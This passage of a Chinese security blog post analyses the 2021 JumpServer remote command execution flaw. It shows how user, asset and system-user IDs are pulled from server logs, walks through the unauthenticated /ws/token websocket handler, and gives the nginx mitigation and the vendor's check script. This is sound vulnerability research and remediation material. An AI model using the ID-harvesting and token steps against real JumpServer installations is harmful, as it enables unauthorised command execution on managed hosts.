<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@www jumpserver]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS                       PORTS                                         NAMES</span><br><span class="line">d622578bafab        jumpserver/nginx:alpine2      <span class="string">&quot;sh -c &#x27;crond -b -d …&quot;</span>   About an hour ago   Up About an hour (healthy)   0.0.0.0:8080-&gt;80/tcp, 0.0.0.0:8443-&gt;443/tcp   jms_nginx</span><br><span class="line">1027e9f8f2ec        jumpserver/guacamole:v2.6.1   <span class="string">&quot;/init&quot;</span>                  About an hour ago   Up About an hour (healthy)   8080/tcp                                      jms_guacamole</span><br><span class="line">23f1a02bfd9d        jumpserver/core:v2.6.1        <span class="string">&quot;./entrypoint.sh sta…&quot;</span>   About an hour ago   Up About an hour (healthy)   8070/tcp, 8080/tcp                            jms_celery</span><br><span class="line">fceeb00ef925        jumpserver/luna:v2.6.1        <span class="string">&quot;/docker-entrypoint.…&quot;</span>   About an hour ago   Up About an hour (healthy)   80/tcp                                        jms_luna</span><br><span class="line">f9dbd7a214a1        jumpserver/koko:v2.6.1        <span class="string">&quot;./entrypoint.sh&quot;</span>        About an hour ago   Up About an hour (healthy)   0.0.0.0:2222-&gt;2222/tcp, 5000/tcp              jms_koko</span><br><span class="line">de0493c1c684        jumpserver/lina:v2.6.1        <span class="string">&quot;/docker-entrypoint.…&quot;</span>   About an hour ago   Up About an hour (healthy)   80/tcp                                        jms_lina</span><br><span class="line">b58ecd6cd3d8        jumpserver/core:v2.6.1        <span class="string">&quot;./entrypoint.sh sta…&quot;</span>   About an hour ago   Up About an hour (healthy)   8070/tcp, 8080/tcp                            jms_core</span><br><span class="line">72599fc5b96e        jumpserver/redis:6-alpine     <span class="string">&quot;docker-entrypoint.s…&quot;</span>   3 days ago          Up 3 hours (healthy)         6379/tcp                                      jms_redis</span><br><span class="line">c2cecdd822bc        jumpserver/mysql:5            <span class="string">&quot;docker-entrypoint.s…&quot;</span>   3 days ago          Up 3 hours (healthy)         3306/tcp, 33060/tcp                           jms_mysql</span><br><span class="line">[root@www jumpserver]<span class="comment"># docker exec -it b58ecd6cd3d8 bash</span></span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver<span class="comment"># ls</span></span><br><span class="line">apps		    data	entrypoint.sh  logs	     release	    tmp</span><br><span class="line">config_example.yml  Dockerfile	jms	       README_EN.md  requirements   utils</span><br><span class="line">config.yml	    docs	LICENSE        README.md     run_server.py  Vagrantfile</span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver<span class="comment"># cd logs</span></span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver/logs<span class="comment"># ls</span></span><br><span class="line">ansible.log			     celery_heavy_tasks.log  gunicorn.log</span><br><span class="line">beat.log			     celery_node_tree.log    jumpserver.log</span><br><span class="line">celery_ansible.log		     daphne.log		     unexpected_exception.log</span><br><span class="line">celery_check_asset_perm_expired.log  drf_exception.log</span><br><span class="line">celery_default.log		     flower.log</span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver/logs<span class="comment"># cat gunicorn.log  | grep api/v1/perms/asset-permissions/user/validate</span></span><br><span class="line">192.168.250.6 [25/Jan/2021:17:03:58 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:17:03:58 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:17:04:22 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:17:44:13 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">192.168.250.6 [25/Jan/2021:18:02:16 +0800] <span class="string">&quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot;</span> 200 12</span><br><span class="line">root@b58ecd6cd3d8:/opt/jumpserver/logs<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>2、</p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><h2 id="查看代码修改记录"><a href="#查看代码修改记录" class="headerlink" title="查看代码修改记录"></a>查看代码修改记录</h2><p>1、查看单个文件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/jumpserver/jumpserver/blob/master/apps/authentication/api/auth.py">https://github.com/jumpserver/jumpserver/blob/master/apps/authentication/api/auth.py</a></p>
<p>2、查看历史记录</p>
<p>将github.com替换为github.githistory.xyz</p>
<p>3、查看修改日期2021-01-14</p>
<p><a target="_blank" rel="noopener" href="https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py">https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jumpserver/jumpserver/commit/db6f7f66b2e5e557081cb561029f64af0a1f80c4">https://github.com/jumpserver/jumpserver/commit/db6f7f66b2e5e557081cb561029f64af0a1f80c4</a></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218163819021.png" alt="image-20210218163819021"></p>
<h2 id="代码调用逻辑"><a href="#代码调用逻辑" class="headerlink" title="代码调用逻辑"></a>代码调用逻辑</h2><p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/d45b6183332c145770f174c3effa49f0.png" alt="img"></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/079d1e2b0daeb9145aa74a74f390fc44.png" alt="img"></p>
<p> web终端地方存在相关token操作的js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let wsURL &#x3D; baseWsUrl + &#39;&#x2F;koko&#x2F;ws&#x2F;terminal&#x2F;?&#39; + urlParams.toString();</span><br><span class="line">switch (urlParams.get(&quot;type&quot;)) &#123;</span><br><span class="line">    case &#39;token&#39;:</span><br><span class="line">        wsURL &#x3D; baseWsUrl + &quot;&#x2F;koko&#x2F;ws&#x2F;token&#x2F;?&quot; + urlParams.toString();</span><br><span class="line">        break</span><br><span class="line">    default:</span><br><span class="line">&#125;</span><br><span class="line">ws &#x3D; new WebSocket(wsURL, [&quot;JMS-KOKO&quot;]);</span><br><span class="line">term &#x3D; createTerminalById(elementId)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func (s *server) websocketHandlers(router *gin.RouterGroup) &#123; #web终端地方存在相关token操作的js的对应服务端&#x2F;ws&#x2F;token 路由</span><br><span class="line">    wsGroup :&#x3D; router.Group(&quot;&#x2F;ws&#x2F;&quot;)</span><br><span class="line"></span><br><span class="line">    wsGroup.Group(&quot;&#x2F;terminal&quot;).Use(</span><br><span class="line">        s.middleSessionAuth()).GET(&quot;&#x2F;&quot;, s.processTerminalWebsocket)</span><br><span class="line"></span><br><span class="line">    wsGroup.Group(&quot;&#x2F;elfinder&quot;).Use(</span><br><span class="line">        s.middleSessionAuth()).GET(&quot;&#x2F;&quot;, s.processElfinderWebsocket)</span><br><span class="line"></span><br><span class="line">    wsGroup.Group(&quot;&#x2F;token&quot;).GET(&quot;&#x2F;&quot;, s.processTokenWebsocket)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (s *server) processTokenWebsocket(ctx *gin.Context) &#123; #判断是否有token,并查询相应的token对应的参数并运行虚拟终端</span><br><span class="line">    tokenId, _ :&#x3D; ctx.GetQuery(&quot;target_id&quot;)</span><br><span class="line">    tokenUser :&#x3D; service.GetTokenAsset(tokenId)</span><br><span class="line">    if tokenUser.UserID &#x3D;&#x3D; &quot;&quot; &#123;</span><br><span class="line">        logger.Errorf(&quot;Token is invalid: %s&quot;, tokenId)</span><br><span class="line">        ctx.AbortWithStatus(http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    currentUser :&#x3D; service.GetUserDetail(tokenUser.UserID)</span><br><span class="line">    if currentUser &#x3D;&#x3D; nil &#123;</span><br><span class="line">        logger.Errorf(&quot;Token userID is invalid: %s&quot;, tokenUser.UserID)</span><br><span class="line">        ctx.AbortWithStatus(http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    targetType :&#x3D; TargetTypeAsset</span><br><span class="line">    targetId :&#x3D; strings.ToLower(tokenUser.AssetID)</span><br><span class="line">    systemUserId :&#x3D; tokenUser.SystemUserID</span><br><span class="line">    s.runTTY(ctx, currentUser, targetType, targetId, systemUserId)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="浏览器体现方式"><a href="#浏览器体现方式" class="headerlink" title="浏览器体现方式"></a>浏览器体现方式</h2><p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174232535.png" alt="image-20210218174232535"></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174240992.png" alt="image-20210218174240992"></p>
<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><p>官方修复方式：</p>
<p><a target="_blank" rel="noopener" href="https://blog.fit2cloud.com/?p=1761">https://blog.fit2cloud.com/?p=1761</a></p>
<ol>
<li>将JumpServer升级至安全版本；</li>
<li>临时修复方案:</li>
</ol>
<p>修改 Nginx 配置文件屏蔽漏洞接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;</span><br></pre></td></tr></table></figure>
<p>Nginx 配置文件位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 社区老版本</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;jumpserver.conf</span><br><span class="line"></span><br><span class="line"># 企业老版本</span><br><span class="line">jumpserver-release&#x2F;nginx&#x2F;http_server.conf</span><br><span class="line"></span><br><span class="line"># 新版本在 </span><br><span class="line">jumpserver-release&#x2F;compose&#x2F;config_static&#x2F;http_server.conf</span><br></pre></td></tr></table></figure>
<p>修改 Nginx 配置文件实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 保证在 &#x2F;api 之前 和 &#x2F; 之前</span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 新增以上这些</span><br><span class="line">location &#x2F;api&#x2F; &#123;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;core:8080;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>修改完成后重启 nginx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker方式: </span><br><span class="line">docker restart jms_nginx</span><br><span class="line"></span><br><span class="line">nginx方式:</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>
<p>修复验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"># 使用方法 bash jms_bug_check.sh HOST </span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">漏洞已修复</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>JumpServer 远程命令执行-2021</p><p><a href="http://b0u4ne.gihub.io/2021/01/25/JumpServer-远程命令执行-2021/">http://b0u4ne.gihub.io/2021/01/25/JumpServer-远程命令执行-2021/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>B0urne</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-01-25</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-02-23</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="www.baidu.com" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.png" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">FckEditor编辑器上传漏洞getshel总结</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/01/23/%E5%85%B3%E9%97%AD%E5%B8%B8%E8%A7%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84HSTS%E5%8A%9F%E8%83%BD/"><span class="level-item">关闭常见浏览器的HSTS功能</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="B0urne"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">B0urne</p><p class="is-size-6 is-block">渗透测试/WEB安全</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">81</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#简介"><span class="level-left"><span class="level-item">1</span><span class="level-item">简介</span></span></a></li><li><a class="level is-mobile" href="#漏洞概述"><span class="level-left"><span class="level-item">2</span><span class="level-item">漏洞概述</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#利用流程"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">利用流程</span></span></a></li><li><a class="level is-mobile" href="#影响版本"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">影响版本</span></span></a></li></ul></li><li><a class="level is-mobile" href="#环境搭建"><span class="level-left"><span class="level-item">3</span><span class="level-item">环境搭建</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#安装JumpServer-v2-6-1"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">安装JumpServer v2.6.1</span></span></a></li><li><a class="level is-mobile" href="#访问web端"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">访问web端</span></span></a></li></ul></li><li><a class="level is-mobile" href="#脚本复现"><span class="level-left"><span class="level-item">4</span><span class="level-item">脚本复现</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#脚本1"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">脚本1</span></span></a></li><li><a class="level is-mobile" href="#脚本2"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">脚本2</span></span></a></li></ul></li><li><a class="level is-mobile" href="#手工复现"><span class="level-left"><span class="level-item">5</span><span class="level-item">手工复现</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#插件验证websocket未授权"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">插件验证websocket未授权</span></span></a></li><li><a class="level is-mobile" href="#获取-asset-id-system-user-id-user-id"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">获取 asset_id,system_user_id,user_id</span></span></a></li><li><a class="level is-mobile" href="#获取token"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">获取token</span></span></a></li><li><a class="level is-mobile" href="#获取响应的通讯ID"><span class="level-left"><span class="level-item">5.4</span><span class="level-item">获取响应的通讯ID</span></span></a></li></ul></li><li><a class="level is-mobile" href="#代码分析"><span class="level-left"><span class="level-item">6</span><span class="level-item">代码分析</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#查看代码修改记录"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">查看代码修改记录</span></span></a></li><li><a class="level is-mobile" href="#代码调用逻辑"><span class="level-left"><span class="level-item">6.2</span><span class="level-item">代码调用逻辑</span></span></a></li><li><a class="level is-mobile" href="#浏览器体现方式"><span class="level-left"><span class="level-item">6.3</span><span class="level-item">浏览器体现方式</span></span></a></li></ul></li><li><a class="level is-mobile" href="#修复方式"><span class="level-left"><span class="level-item">7</span><span class="level-item">修复方式</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://www.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">oldthree</span></span><span class="level-right"><span class="level-item tag">www.ol4three.com</span></span></a></li><li><a class="level is-mobile" href="http://blog.leanote.com/xcniao@foxmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">XCniao</span></span><span class="level-right"><span class="level-item tag">blog.leanote.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Mac/"><span class="level-start"><span class="level-item">Mac</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQL注入</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/SpringBoot/"><span class="level-start"><span class="level-item">SpringBoot</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/XSS/"><span class="level-start"><span class="level-item">XSS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/hexo/"><span class="level-start"><span class="level-item">hexo</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">web渗透</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li><li><a class="level is-mobile" href="/categories/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="level-start"><span class="level-item">人生感悟</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%9B%E9%98%B6/"><span class="level-start"><span class="level-item">博客搭建进阶</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%8F%90%E6%9D%83/"><span class="level-start"><span class="level-item">提权</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="level-start"><span class="level-item">文件上传</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="level-start"><span class="level-item">服务器原理</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">渗透测试</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/recurrent/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><span class="level-start"><span class="level-item">漏洞挖掘</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%95%E8%BF%87/"><span class="level-start"><span class="level-item">绕过</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"><span class="level-start"><span class="level-item">问题汇总</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%9D%A2%E8%AF%95/"><span class="level-start"><span class="level-item">面试</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-16T08:46:18.000Z">2021-03-16</time></p><p class="title"><a href="/2021/03/16/OpenSSH%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE-CVE-2018-15473/">OpenSSH用户名枚举_CVE-2018-15473</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-16T08:46:08.000Z">2021-03-16</time></p><p class="title"><a href="/2021/03/16/OpenSSHy%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE-CVE-2018-15473/">OpenSSHy用户名枚举_CVE-2018-15473</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-01T07:39:36.000Z">2021-02-01</time></p><p class="title"><a href="/2021/02/01/CVE-2021-3156-Sudo%E6%8F%90%E6%9D%83/">CVE-2021-3156 Sudo提权</a></p><p class="categories"><a href="/categories/%E6%8F%90%E6%9D%83/">提权</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T05:24:31.000Z">2021-01-29</time></p><p class="title"><a 